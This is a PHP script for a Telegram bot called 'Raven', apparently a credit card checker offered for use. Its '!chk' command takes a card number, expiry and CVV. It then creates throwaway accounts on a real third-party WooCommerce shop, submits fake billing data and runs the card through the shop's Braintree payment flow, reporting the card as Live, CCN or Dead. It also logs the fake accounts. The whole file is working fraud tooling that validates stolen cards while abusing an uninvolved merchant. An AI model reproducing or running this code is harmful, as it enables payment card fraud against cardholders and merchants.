<?php
error_reporting(0);

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    extract($_POST);
}
else {
    extract($_GET);
}

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function RandomString($length = 7)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$content = file_get_contents("php://input");
$update = json_decode($content, true);
$chat_id = $update["message"]["chat"]["id"];
$message = $update["message"]["text"];
$id = $update["message"]["from"]["id"];
$username = $update["message"]["from"]["username"];
$firstname = $update["message"]["from"]["first_name"];
$bot_name = "Raven" ;
$user = RandomString().mt_rand(1, 999);


if($message == "/start"){

    send_message($chat_id, "Hey $firstname! I am $bot_name, hit /help to know more about me. =)");
}

if($message == "/help"){

    send_message($chat_id, "Type any of the following commands, then I will do it for you! =)\n\n!bin <bin>\n!chk XXXXXXXXXXXXXXXX|XX|XXXX|XXX");
}


if(strpos($message, "!bin") === 0){

    $card = substr($message, 5);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://binlist.pro/',
        CURLOPT_HEADER => 0,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_COOKIEFILE => getcwd(). "/$user.txt",
        CURLOPT_COOKIEJAR => getcwd(). "/$user.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $prepare = curl_exec($ch);
    $csrf_token = GetStr($prepare, 'name="_token" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://binlist.pro/process_bin',
        CURLOPT_HEADER => 0,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_COOKIEFILE => getcwd(). "/$user.txt",
        CURLOPT_COOKIEJAR => getcwd(). "/$user.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://binlist.pro',
            'referer: https://binlist.pro/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '_token='.$csrf_token.'&bins='.$card
    ));
    $bin_execute = curl_exec($ch);
    curl_close($ch);

    $bin = GetStr(GetStr($bin_execute, '<tbody>', '</tbody>'), '<td>', '</td>');
    $brand = GetStr(GetStr($bin_execute, $bin, '</tbody>'), '<td>', '</td>');
    $type = GetStr(GetStr($bin_execute, $brand, '</tbody>'), '<td>', '</td>');
    $category = GetStr(GetStr($bin_execute, $type, '</tbody>'), '<td>', '</td>');
    $country = GetStr(GetStr($bin_execute, $category, '</tbody>'), '<td>', '</td>');
    $bank = GetStr(GetStr($bin_execute, $country, '</tbody>'), '<td>', '</td>');

    if(strpos($bank, 'target="_blank">')){
        $bank = GetStr($bank, 'target="_blank">', '</a>');
    }

    $bin = str_replace(array("\n", "\r", "  "), "", $bin);
    $brand = str_replace(array("\n", "\r", "  "), "", $brand);
    $type = str_replace(array("\n", "\r", "  "), "", $type);
    $category = str_replace(array("\n", "\r", "  "), "", $category);
    $country = str_replace(array("\n", "\r", "  "), "", $country);
    $bank = str_replace(array("\n", "\r", "  "), "", $bank);

    if ($card != null && $bin != null) {
        send_message($chat_id, "✅ VALID BIN\nBin: $bin\nBrand: $brand\nType: $type\nCategory: $category\nBank: $bank\nCountry: $country 🌏");
    }
    else {
        send_message($chat_id, "❌ Invalid BIN! ");
    }
    unlink("$user.txt");
}

if(strpos($message, "!chk") === 0){

    $card = substr($message, 5);
    $separator = explode("|", $card);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];

    $postcode = mt_rand(10080, 94545);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/my-account/add-payment-method/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $prepare_register = curl_exec($ch);
    $register_nonce = GetStr($prepare_register, 'name="woocommerce-register-nonce" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/my-account/add-payment-method/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://fitveganchef.com',
            'referer: https://fitveganchef.com/my-account/add-payment-method/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "email=$user@gmail.com&password=$user&mailchimp_woocommerce_newsletter=1&woocommerce-register-nonce=$register_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register",
    ));
    $register = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/my-account/edit-address/billing/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'referer: https://fitveganchef.com/my-account/edit-address/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $prepare_address = curl_exec($ch);
    $edit_address_nonce = GetStr($prepare_address, 'name="woocommerce-edit-address-nonce" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/my-account/edit-address/billing/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://fitveganchef.com',
            'referer: https://fitveganchef.com/my-account/edit-address/billing/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_first_name=Kuru&billing_last_name=Shiki&billing_company=&billing_country=US&billing_address_1=23+balkan+road&billing_address_2=&billing_city=city&billing_state=CA&billing_postcode=$postcode&billing_phone=1231231234&billing_email=$user@gmail.com&save_address=Save+address&woocommerce-edit-address-nonce=$edit_address_nonce&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address",
    ));
    $edit_address = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/my-account/add-payment-method/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'referer: https://fitveganchef.com/my-account/payment-methods/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $prepare_payment = curl_exec($ch);
    $add_payment_nonce = GetStr($prepare_payment, 'name="woocommerce-add-payment-method-nonce" value="', '"');
    $braintree_nonce = GetStr($prepare_payment, '"type":"credit_card","client_token_nonce":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/wp-admin/admin-ajax.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://fitveganchef.com',
            'referer: https://fitveganchef.com/my-account/add-payment-method/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'x-requested-with: XMLHttpRequest'
        ),
        CURLOPT_POSTFIELDS => "action=wc_braintree_credit_card_get_client_token&nonce=$braintree_nonce",
    ));
    $admin_ajax = curl_exec($ch);
    $clientToken = GetStr($admin_ajax, '"data":"', '"');
    $decoded = base64_decode($clientToken);
    $parsedToken = GetStr($decoded, '"authorizationFingerprint":"', '"');
    $b3ClientId = GetStr($decoded, '"braintreeClientId":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$user.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$user.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'Authorization: Bearer '.$parsedToken.'',
            'braintree-version: 2018-05-10',
            'content-type: application/json',
            'Origin: https://assets.braintreegateway.com',
            'Referer: https://assets.braintreegateway.com/web/3.48.0/html/hosted-fields-frame.min.html',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"f657d269-0ff2-4cc2-80dd-75405559fe4a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    ));
    $graphql = curl_exec($ch);
    $token = GetStr($graphql, '"token":"','"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://fitveganchef.com/my-account/add-payment-method/',
        CURLOPT_HEADER => 0,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_COOKIEFILE => getcwd(). "/$user.txt",
        CURLOPT_COOKIEJAR => getcwd(). "/$user.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://fitveganchef.com',
            'Referer: https://fitveganchef.com/my-account/add-payment-method/',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=$cbin&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce=$token&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce=$add_payment_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
    ));
    $execute = curl_exec($ch);
    curl_close($ch);
    $respo = GetStr($execute, 'Status code ', '</li>');
    fwrite(fopen("bot.txt", "a"), $user."@gmail.com:".$user."\r\n");

    if(strpos($execute, 'payment method added') || strpos($execute, 'Gateway Rejected: avs')) {
        send_message($chat_id, "Status: ðŸŸ¢ Live \nCC: $card\nResponse: Approved\nChecked By: @$username\nReference: $user");
    }
    elseif(strpos($execute, 'Card Issuer Declined CVV')) {
        send_message($chat_id, "Status: ðŸ”µ CCN \nCC: $card\nResponse: $respo\nChecked By: @$username\nReference: $user");
    }
    elseif(strpos($execute, 'Status code')) {
        send_message($chat_id, "Status: ðŸ”´ Dead \nCC: $card\nResponse: $respo\nChecked By: @$username\nReference: $user");
    }
    else{
        send_message($chat_id, "I am busy, try again!");
    }
    unlink("$user.txt");
}

function send_message($chat_id, $message){

    $apiToken =  "PUT YOUR BOT TOKEN HERE";
    $text = urlencode($message);
    file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
}
?>
